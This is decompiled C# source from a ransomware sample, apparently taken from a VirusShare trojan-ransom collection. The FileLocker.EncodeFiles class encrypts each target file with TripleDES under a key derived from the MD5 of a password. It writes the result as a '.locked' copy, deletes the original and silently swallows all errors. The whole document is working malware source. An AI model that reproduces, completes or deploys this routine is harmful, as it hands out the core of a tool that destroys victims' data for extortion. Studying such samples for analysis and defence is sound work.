// Decompiled with JetBrains decompiler
// Type: FileLocker.EncodeFiles
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace FileLocker
{
  [StandardModule]
  public sealed class EncodeFiles
  {
    public static string Password;

    public static void WriteFile(string string_0, string string_1)
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(string_0);
        streamWriter.Write(string_1);
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string tdsEncode(string string_0, string string_1, bool bool_0 = false)
    {
      TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(string_1));
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(string_0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static void Encode_File(string string_0)
    {
      try
      {
        string string_1 = EncodeFiles.tdsEncode(Convert.ToBase64String(File.ReadAllBytes(string_0)), EncodeFiles.Password);
        EncodeFiles.WriteFile(string_0 + ".locked", string_1);
        File.Delete(string_0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
